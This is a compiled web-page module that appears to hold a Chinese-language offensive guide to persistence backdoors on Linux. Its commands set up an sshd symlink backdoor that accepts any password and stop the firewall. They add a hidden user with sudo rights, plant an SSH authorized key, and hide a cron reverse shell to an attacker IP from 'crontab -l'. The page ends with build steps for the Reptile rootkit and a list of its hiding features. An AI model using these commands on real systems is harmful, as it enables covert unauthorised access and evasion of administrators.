import{_ as e}from"./_plugin-vue_export-helper.cdc0426e.js";import{o as i,c as t,a as s,b as l,d as c,e as n,r as o}from"./app.04d5a320.js";const d={},r=n(`<h2 id="ssh软连接后门" tabindex="-1"><a class="header-anchor" href="#ssh软连接后门" aria-hidden="true">#</a> SSH软连接后门</h2><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token comment">#建立sshd的软连接</span>
<span class="token function">ln</span> <span class="token parameter variable">-sf</span> /usr/sbin/sshd /tmp/su<span class="token punctuation">;</span>/tmp/su <span class="token parameter variable">-oPort</span><span class="token operator">=</span><span class="token number">12345</span>
systemctl stop firewalld

<span class="token comment">#连接目标，密码随便输入即可</span>
<span class="token function">ssh</span> root@212.1x9.2xx.xx7 <span class="token parameter variable">-p12345</span>
 
<span class="token comment">#删除后门</span>
<span class="token function">rm</span> <span class="token parameter variable">-rf</span> /tmp/su
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="增加超级用户账号" tabindex="-1"><a class="header-anchor" href="#增加超级用户账号" aria-hidden="true">#</a> 增加超级用户账号</h2><p>如果系统不允许uid=0的用户（root）远程登录，可以添加一个普通用户，并将其加入sudoers</p><p><strong>增加用户</strong></p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token comment">#添加账户，设置密码(密码符合要密码强度策略)</span>
<span class="token function">useradd</span> phP
<span class="token builtin class-name">echo</span> @admin.886<span class="token operator">|</span><span class="token function">passwd</span> <span class="token parameter variable">--stdin</span> phP


<span class="token comment">#修改sudoers赋予sudo权限</span>
<span class="token function">chmod</span> +w /etc/sudoers   
<span class="token builtin class-name">echo</span> <span class="token string">&quot;phP ALL=(ALL) ALL&quot;</span> <span class="token operator">&gt;&gt;</span> /etc/sudoers
<span class="token function">chmod</span> <span class="token parameter variable">-w</span> /etc/sudoers
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="ssh公钥登录" tabindex="-1"><a class="header-anchor" href="#ssh公钥登录" aria-hidden="true">#</a> SSH公钥登录</h2><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token comment">#本机生成rsa公钥</span>
ssh-keygen <span class="token parameter variable">-t</span> rsa

<span class="token comment">#把id_rsa.pub写入服务端的authorized_keys中</span>
<span class="token function">chmod</span> <span class="token number">600</span> ~/.ssh/authorized_keys
<span class="token function">chmod</span> <span class="token number">700</span> ~/.ssh
<span class="token builtin class-name">echo</span> <span class="token string">&quot;id_rsa.pub的内容&quot;</span> <span class="token operator">&gt;</span> ~/.ssh/authorized_keys

<span class="token comment">#没有这个文件的话，就自己创建一个</span>
<span class="token function">mkdir</span> <span class="token parameter variable">-p</span> ~/.ssh
<span class="token function">touch</span> ~/.ssh/authorized_keys

<span class="token comment">#如果还是不行,修改配置文件</span>
/etc/ssh/sshd_config

PasswordAuthentication <span class="token function">yes</span>　　　　　　<span class="token comment"># 口令登录</span>
RSAAuthentication <span class="token function">yes</span>　　　　　　　　　<span class="token comment"># RSA认证</span>
PubkeyAuthentication <span class="token function">yes</span>　　　　　　　<span class="token comment"># 公钥登录 </span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="crontab定时反弹shell" tabindex="-1"><a class="header-anchor" href="#crontab定时反弹shell" aria-hidden="true">#</a> Crontab定时反弹shell</h2><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token punctuation">(</span>crontab -l<span class="token punctuation">;</span><span class="token builtin class-name">printf</span> <span class="token string">&quot;*/1 * * * * exec 9&lt;&gt; /dev/tcp/攻击者IP/8888;exec 0&lt;&amp;9;exec 1&gt;&amp;9 2&gt;&amp;1;/bin/bash --noprofile -i;<span class="token entity" title="\\r">\\r</span>no crontab for <span class="token variable"><span class="token variable">\`</span><span class="token function">whoami</span><span class="token variable">\`</span></span>%100c<span class="token entity" title="\\n">\\n</span>&quot;</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token function">crontab</span> -

<span class="token comment">#每分钟执行一次，并且crontab -l看不出来</span>
<span class="token comment">#这种要用crontab -e 进去查看并编辑才能看到</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="rootkit" tabindex="-1"><a class="header-anchor" href="#rootkit" aria-hidden="true">#</a> RootKit</h2>`,11),p={href:"https://github.com/f0rb1dd3n/Reptile",target:"_blank",rel:"noopener noreferrer"},u=n(`<div class="custom-container tip"><p class="custom-container-title">特点</p><p>Ø网络隐藏（TCP/UDP）</p><p>Ø文件隐藏</p><p>Ø进程隐藏</p><p>Ø持久性隐藏（自启动）</p><p>Ø本地权限提升</p><p>ØICMP/UDP/TCP 端口锁定后门</p><p>Ø具有文件传输功能的完整 TTY/PTY Shell</p><p>Ø外壳每 X 次回连（非默认）</p></div><details class="custom-container details"><summary>安装服务端</summary><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>yum <span class="token function">install</span> <span class="token parameter variable">-y</span> ncurses-devel

<span class="token function">make</span> menuconfig

<span class="token function">make</span> <span class="token comment">#设置好配置后，只需运行 make，它就会生成所需的一切</span>

<span class="token function">make</span> <span class="token function">install</span> <span class="token comment">#安装</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details><details class="custom-container details"><summary>安装客户端</summary><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>yum <span class="token function">install</span> readline-devel

<span class="token function">make</span> client <span class="token comment">#编译客户端</span>

./client         <span class="token comment">#运行客户端</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details>`,3);function m(v,b){const a=o("ExternalLinkIcon");return i(),t("div",null,[r,s("p",null,[s("a",p,[l("https://github.com/f0rb1dd3n/Reptile"),c(a)])]),u])}const f=e(d,[["render",m],["__file","权限维持-Linux后门.html.vue"]]);export{f as default};
